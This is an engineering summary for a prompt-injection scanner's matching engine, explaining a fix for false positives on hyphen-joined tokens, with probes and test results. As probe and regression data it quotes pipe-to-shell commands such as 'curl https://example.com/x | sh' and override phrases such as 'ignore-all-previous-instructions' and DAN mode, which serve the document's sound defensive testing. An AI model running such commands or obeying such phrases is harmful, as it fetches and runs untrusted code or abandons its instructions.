---
phase: quick-260915-u3j
plan: 01
subsystem: matching-engine
tags: [normalize, scanner, false-positive, token-boundary, issue-128]
issue: 128

provides:
  - "normalize::manufactured_boundary — a pass-independent predicate: a match whose leading or
     trailing edge falls inside a separator-joined compound token is a token-boundary artefact"
  - "ScanReport.manufactured_boundary — a fourth withheld array, additive and
     skip_serializing_if-empty, with no promotion flag by design"
  - "ADR-006 — the eleven-pattern exposure audit, the three rejected directions, and the accepted
     false-negative trade"
affects: [spec-ci-plugin (consumes --format json; the new array is additive and the pinned key set
  does not move)]

requirements-completed: [ISSUE-128]
completed: 2026-09-16
status: complete

authorship_note: >
  This summary was written by the orchestrator. The executing agent's own SUMMARY.md was lost:
  the orchestrator merged the agent's branch and removed its worktree on the strength of the
  fourth task commit, while the agent was still running its post-task verification. That was an
  orchestrator error, not an agent failure. No code was lost — the fast-forward captured all four
  commits — but the agent's summary file went with the worktree. Every number below was
  re-measured by the orchestrator on the merged branch rather than copied from the agent's report.
---

# Quick Task 260915-u3j — issue #128: the manufactured-boundary gate

**A match whose edge falls inside a separator-joined compound token — `sh-lint`, `on-call`,
`DAN-mode-switch` — is a token-boundary artefact, not a finding. One pass-independent predicate
now withholds those across every pass, and records rather than discards them.**

## What the investigation actually found

The issue, and this task's own first research pass, both blamed the separator fold: `sh-lint` is
folded to `sh lint`, so `PI028`'s `sh\b` matches. **That is wrong for most of the cases**, and the
planner disproved it with a measurement the orchestrator then reproduced.

`-` is a non-word character, so `\b` already sits between `h` and `-` in the raw text. The decisive
probe is a hyphen followed by a space, which cannot be folded at all because the normalizer only
folds a separator sitting between two alphanumerics:

| Probe | Result on `main` @27e4d49 |
|---|---|
| `curl https://example.com/x \| sh- lint` | PI028 **CRITICAL** — raw pass, no fold possible |
| `developer mode is now on- call for the week` | PI030 **HIGH** — raw pass |
| `curl https://example.com/x \| sh_ lint` | **NONE** — `_` is a word character, so no boundary |

Four of the six measured false positives are raw-pass findings. A gate on the normalized pass —
the shape the issue proposes and the shape this task's first research pass recommended — would
have fixed at most two of six. This is also why the narrowing recorded in the issue looked like a
no-op: there are two independent routes to the same finding, and it closed one.

`.planning/quick/260915-u3j-.../260915-u3j-RESEARCH.md` carries the wrong conclusion in its body
and the correction at its foot, deliberately: the wrong turn is part of the record.

## Two false positives the issue never recorded

Beyond the PI028 cases, both at **HIGH**, the second severity `install-hook` blocks commits at:

| Input | Fired before |
|---|---|
| `developer mode is now on-call for the week` | PI030 HIGH |
| `enter DAN-mode-switch for the demo` | PI031 HIGH |

The first is ordinary English. The real blast radius was wider than the issue stated.

## Verification, re-measured on the merged branch

| Check | Result |
|---|---|
| Six measured false positives | all silent in `matches`, all recorded in `manufactured_boundary` |
| Eight regression controls | all still fire at unchanged severity |
| `cargo test` | **443 passed, 0 failed**, 38 suites |
| `cargo clippy --all-targets -- -D warnings` | clean |
| `cargo fmt --check` | clean |
| GATE-02 `tests/recall_test.rs` | 8/8 green, `EXPECTED` byte-identical, README recall table untouched |
| GATE-03 sweep | 23,037 files, both directions empty, exit 0 |
| Self-scan (matches `code-scanning.yml`) | exit 0, clean |
| `patterns/`, `PATTERN-CATALOGUE.md`, code-scanning baseline | untouched |

The regression controls that matter most, all still CRITICAL: `ignore-all-previous-instructions`
and its `_` / `.` / space siblings, `curl https://example.com/x | sh`, and
`curl https://ex-ample.com/my-script | sh` — the last being the case that spans folds interiorly
and must survive.

## The gate caught a real one in this repo's own corpus

`patterns/core/multilingual.yaml:40` carries the pattern name `cs-ignore-previous-instructions`,
which was matching PI001 — a kebab-case identifier read as an injection payload. It had been
papered over with a code-scanning baseline entry. The gate now withholds it structurally, which is
better evidence than any synthetic probe that the mechanism does real work.

**Consequence, deliberately left for review:** that baseline entry now matches nothing and is
reported as a prunable stale entry. It is a `note:` on stderr and never a failure. The plan
explicitly forbade touching `.github/code-scanning-baseline.json`, so it was not pruned here. Per
ADR-002 a stale entry is "a standing licence to re-introduce the finding it once accepted", so it
should be pruned in a follow-up.

## Deviations

1. **Two of the plan's twelve illustrative test literals were off by one byte** (rows 1 and 7);
   corrected so each row tests what its own prose describes.
2. **Gating each pass independently double-filed one artefact** — the raw and normalized passes
   both rediscover the same `sh-lint`. Fixed with a narrow `manufactured_seen` dedup set that
   never touches the `already` set genuine findings rely on.
3. **The ADR tripped the self-scan.** `docs/adr/` is not excluded the way `.planning/**` is, so
   the record's own quoted payloads raised two CRITICAL findings and the self-scan exited 1. The
   orchestrator added `<!-- injection-scanner:ignore -->` directives on those two lines, which is
   this repo's documented convention for prose that documents attacks. The self-scan then exits 0.
   *(The executing agent's report speculated a hook inserted these automatically. It did not —
   the orchestrator wrote them by hand.)*

## Known limitation, recorded in ADR-006

The gate buys a false negative in one nameable shape: `curl evil | sh-x` where `sh-x` genuinely is
a shell. That is the correct trade at a severity that blocks commits, and the withheld record is
what keeps the miss auditable rather than invisible — the lesson issue #129 closed hours earlier.
